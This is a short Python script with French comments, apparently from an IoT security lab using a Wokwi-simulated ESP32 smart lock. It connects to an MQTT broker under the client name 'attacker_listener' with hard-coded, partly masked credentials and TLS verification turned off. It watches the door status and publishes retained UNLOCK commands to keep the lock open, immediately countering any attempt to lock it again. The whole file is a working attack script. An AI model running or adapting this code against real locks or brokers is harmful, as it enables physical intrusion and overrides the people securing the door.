# keep_door_open.py
# Écoute door/status — dès que la porte s'ouvre, la maintient ouverte de force

import paho.mqtt.client as mqtt
import time

BROKER       = "yf4fb665.ala.eu-central-1.emqxsl.com"
PORT         = 8883
USER         = "smart_lock"
PASS         = "IoT2000****"
TOPIC_STATUS = "door/status"
TOPIC_CMD    = "door/command"

door_open = False

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[+] Connecté au broker — en écoute sur door/status...")
        client.subscribe(TOPIC_STATUS)
    else:
        print(f"[-] Erreur connexion : {rc}")

def on_message(client, userdata, msg):
    global door_open
    status = msg.payload.decode()
    print(f"[STATUS] {status}")

    if status == "UNLOCKED":
        if not door_open:
            print("[!] Porte ouverte détectée — activation du maintien forcé !")
            door_open = True

        # Renvoie UNLOCK immédiatement avec retain=True
        # → même si l'ESP32 se reconnecte, il recevra UNLOCK automatiquement
        client.publish(TOPIC_CMD, "UNLOCK", retain=True)
        print("[>] UNLOCK forcé envoyé")

    elif status == "LOCKED":
        if door_open:
            print("[!] Quelqu'un tente de fermer — contre-attaque !")
            # Contre immédiatement la fermeture
            time.sleep(0.1)
            client.publish(TOPIC_CMD, "UNLOCK", retain=True)
            print("[>] UNLOCK re-envoyé pour annuler la fermeture")

client = mqtt.Client(client_id="attacker_listener")
client.username_pw_set(USER, PASS)
client.tls_set()
client.tls_insecure_set(True)
client.on_connect = on_connect
client.on_message = on_message

print("[*] Démarrage — attends que tu ouvres la porte dans Wokwi...")
client.connect(BROKER, PORT, 60)
client.loop_forever()   # tourne indéfiniment